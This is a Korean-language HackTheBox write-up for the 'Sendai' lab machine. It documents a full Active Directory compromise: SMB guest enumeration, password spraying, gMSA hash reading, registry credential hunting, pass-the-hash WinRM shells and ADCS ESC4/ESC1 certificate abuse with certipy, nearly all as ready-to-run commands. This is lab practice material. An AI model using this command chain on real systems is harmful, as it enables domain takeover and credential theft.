# Sendai
- [Port Scanning](https://github.com/jdh5772/Practice_Cyber_Security/edit/main/HackTheBox/Sendai.md#port-scanning)
- [SMB](https://github.com/jdh5772/Practice_Cyber_Security/edit/main/HackTheBox/Sendai.md#smb)
- [Auth as Elliot.Yates/Thomas.Powell](https://github.com/jdh5772/Practice_Cyber_Security/edit/main/HackTheBox/Sendai.md#auth-as-elliotyatesthomaspowell)
- [Shell as MGTSVC$](https://github.com/jdh5772/Practice_Cyber_Security/edit/main/HackTheBox/Sendai.md#shell-as-mgtsvc)
- [Auth as Clifford.davey](https://github.com/jdh5772/Practice_Cyber_Security/edit/main/HackTheBox/Sendai.md#auth-as-clifforddavey)
- [Shell as Administrator](https://github.com/jdh5772/Practice_Cyber_Security/edit/main/HackTheBox/Sendai.md#shell-as-administrator)

## Port Scanning
```bash
sudo nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,5985,9389,49664,49668,59349,59371,61516,61518,61533 -sC -sV -vv -oA sendai 10.129.234.66
```
<img width="1204" height="419" alt="image" src="https://github.com/user-attachments/assets/4300fc94-e7c8-4072-9de8-7fcf248019a2" />
<img width="1209" height="294" alt="image" src="https://github.com/user-attachments/assets/2e4f206b-3830-440f-aa25-867db5d1113e" />
<img width="1209" height="197" alt="image" src="https://github.com/user-attachments/assets/31542e8c-7f8a-4661-90a3-b0286916f46f" />
<img width="1209" height="197" alt="image" src="https://github.com/user-attachments/assets/a3103806-5a07-402a-922c-6ba9d37c7503" />
<img width="1209" height="75" alt="image" src="https://github.com/user-attachments/assets/8bbfa374-4633-4320-a07c-b84124c49666" />

- DNS
- HTTP
- LDAP
- HTTPS
- SMB
- RDP
- WINRM

<br>

- `/etc/hosts`에 `dc.sendai.vl` 추가.
<img width="1209" height="75" alt="image" src="https://github.com/user-attachments/assets/7d726cef-56ea-47fb-8723-55b3d1892985" />

## SMB
- guest login 성공.
```bash
nxc smb 10.129.234.66 -u guest -p ''
```
<img width="1209" height="132" alt="image" src="https://github.com/user-attachments/assets/de5d9883-ef8d-41f2-8d4c-78415e3a96ad" />

<br>
<br>

- `--rid-brute` 옵션을 사용하여 유저 목록 수집.
```bash
nxc smb 10.129.234.66 -u guest -p '' --rid-brute | grep -i sidtypeuser
```
<img width="1209" height="442" alt="image" src="https://github.com/user-attachments/assets/42503240-57e6-4d5b-a934-494752960d2a" />

<br>
<br>

- 공유 폴더 목록 확인.
- `/sendai` 폴더를 `guest`가 읽기 가능.
```bash
nxc smb 10.129.234.66 -u guest -p '' --shares
```
<img width="1209" height="402" alt="image" src="https://github.com/user-attachments/assets/0a7fd273-9eb1-4ce3-be84-005bc9de2d60" />

<br>
<br>

- `smbclient`를 사용하여 SMB에 접속하여 확인.
- `incident.txt` 파일 다운로드.
```bash
smbclient -U guest //10.129.234.66/sendai
```
<img width="1209" height="416" alt="image" src="https://github.com/user-attachments/assets/3bc78d51-a005-4f7c-a4ee-97741f3babf5" />

## Auth as Elliot.Yates/Thomas.Powell
- `incient.txt` 파일에서 알아차리기 쉬운 비밀번호가 설정되어 있는 계정들에 대해서 계정을 만료시켜 비밀번호를 변경하도록 했다고 적혀 있음.
<img width="1204" height="274" alt="image" src="https://github.com/user-attachments/assets/6464fe5d-cd2c-4c08-b89b-8bc7646cb0f1" />

<br>
<br>

- 이외의 특별한 정보를 찾을 수 없어 모든 유저에 대해서 비밀번호를 ‘’로 지정하여 로그인 시도.
- `Elliot.Yates` 과 `Thomas.Powell`의 계정의 비밀번호 변경 필요.
```bash
nxc smb 10.129.11.10 -u users -p '' --continue-on-success
```
<img width="1204" height="293" alt="image" src="https://github.com/user-attachments/assets/d60a1812-b98e-4f0d-a088-b977eef82831" />

<br>
<br>

- 두 계정의 비밀번호 변경.
```bash
nxc smb 10.129.11.10 -u Elliot.Yates -p '' -M change-password -o NEWPASS='Summer2026!'

nxc smb 10.129.11.10 -u Thomas.Powell -p '' -M change-password -o NEWPASS='Summer2026!'
```
<img width="1204" height="327" alt="image" src="https://github.com/user-attachments/assets/e67caed1-a6bd-4a0f-a5b5-737856216105" />

<br>
<br>

- 로그인 성공.
```bash
nxc smb 10.129.11.10 -u Thomas.Powell -p 'Summer2026!'

nxc smb 10.129.11.10 -u Elliot.Yates -p 'Summer2026!'
```
<img width="1204" height="280" alt="image" src="https://github.com/user-attachments/assets/f5a1ca60-70c7-41e7-aaa7-f7daaccfa983" />

## Shell as MGTSVC$
- `bloodhound`로 `MGTSVC$`로 가는 권한 상승 경로 확인.
<img width="1488" height="220" alt="image" src="https://github.com/user-attachments/assets/694d94e4-e1c6-4eda-bb80-ac43cd7c695b" />

<br>
<br>

- `ADMSVC` 그룹에 `Thomas.Powell` 추가.
```bash
bloodyAD -d sendai.vl -u Thomas.Powell -p 'Summer2026!' --dc-ip 10.129.11.10 add groupMember admsvc Thomas.Powell
```
<img width="1205" height="93" alt="image" src="https://github.com/user-attachments/assets/916077ef-08e3-4bac-9255-6a62766fccc8" />

<br>
<br>

- 비밀번호 관리의 번거로움을 피하기 위해서 `gMSA`를 사용.
- 만약 `gMSA`를 읽을 수 있는 권한이 있다면 해당 계정을 탈취가 가능해짐.
```bash
nxc ldap DC.sendai.vl -u Thomas.Powell -p 'Summer2026!' --gmsa
```
<img width="1205" height="202" alt="image" src="https://github.com/user-attachments/assets/cbc685a2-c82b-4c37-9ee4-c3d47ce2bfb1" />

<br>
<br>

- `WINRM` 로그인 성공.
```bash
nxc winrm 10.129.11.10 -u mgtsvc$ -H 04916851945671b02a176029fac231ba
```
<img width="1205" height="211" alt="image" src="https://github.com/user-attachments/assets/11924ea2-8255-4ce7-8e03-dfeb58896da8" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.11.10 -u mgtsvc$ -H 04916851945671b02a176029fac231ba
```
<img width="1205" height="318" alt="image" src="https://github.com/user-attachments/assets/b07e8533-ea16-4da6-81f6-e3ebc73fa095" />

## Auth as clifford.davey
- `EC2`, `helpdesk`, `MicrosoftEdgeUpdate`가 실행되고 있음.
```powershell
ps
```
<img width="1205" height="268" alt="image" src="https://github.com/user-attachments/assets/ac31b244-34bf-4b39-88eb-264447230913" />

<br>
<br>

- `sc`가 작동을 하지 않아 레지스트리 키로 `helpdesk`를 확인.
- `clifford.davey`의 계정 발견.
```powershell
cd hklm:\system\currentcontrolset\services

Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object { $subKey = $_.Name; Get-ItemProperty -Path "Registry::$_" -ErrorAction SilentlyContinue | Where-Object { $_.ImagePath -like "*helpdesk*" } | ForEach-Object { Write-Output "[+] 진짜 서비스 이름: $subKey" } }

Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\support"
```
<img width="1205" height="468" alt="image" src="https://github.com/user-attachments/assets/82e89ac6-d7ee-4ee9-8529-d8bfeb1ea64b" />

<br>
<br>

- 로그인 성공.
```bash
nxc smb 10.129.11.10 -u clifford.davey -p 'RFmoB2WplgE_3p'
```
<img width="1205" height="134" alt="image" src="https://github.com/user-attachments/assets/df579b40-04b7-49ed-9795-c88083abd9c4" />

## Shell as Administrator
- `CA`가 존재하여 `certipy`를 사용하여 취약점 확인.
- `ESC4` 취약점 발견.
```bash
certipy-ad find -u clifford.davey -p 'RFmoB2WplgE_3p' -target dc.sendai.vl -text -stdout -vulnerable
```
<img width="1205" height="58" alt="image" src="https://github.com/user-attachments/assets/2b53276b-034e-4df9-8c1f-428b35401ade" />

<br>
<br>

- 템플릿을 ESC1 취약점으로 변경.
```bash
certipy-ad template -u clifford.davey -p 'RFmoB2WplgE_3p' -dc-ip 10.129.11.10 -template SendaiComputer -write-default-configuration
```
<img width="1205" height="569" alt="image" src="https://github.com/user-attachments/assets/089ad387-2032-4c3a-9b8e-79d657580946" />

<br>
<br>

- 변경된 템플릿을 가지고 인증서 요청.
```bash
certipy-ad req -u clifford.davey -p 'RFmoB2WplgE_3p' -dc-ip 10.129.11.10 -target dc.sendai.vl -ca 'sendai-dc-ca' -template SendaiComputer -upn administrator@sendai.vl -sid 'S-1-5-21-3085872742-570972823-736764132-500'
```
<img width="1205" height="300" alt="image" src="https://github.com/user-attachments/assets/795454ab-164b-4c5d-89ee-1fe2a8b6731a" />

<br>
<br>

- 인증 요청.
- `administrator` 해시 획득.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.11.10
```
<img width="1205" height="369" alt="image" src="https://github.com/user-attachments/assets/5928721a-d356-4ed0-9ca1-f0dc356f054c" />

<br>
<br>

- 로그인 성공.
```bash
nxc winrm 10.129.11.10 -u administrator -H cfb106feec8b89a3d98e14dcbe8d087a
```
<img width="1205" height="228" alt="image" src="https://github.com/user-attachments/assets/4deca9d9-bd2a-456d-93df-66aa89ee58f0" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.11.10 -u administrator -H cfb106feec8b89a3d98e14dcbe8d087a
```
<img width="1205" height="321" alt="image" src="https://github.com/user-attachments/assets/e6f4e1cc-0a20-47dc-89bd-41b26bc09780" />
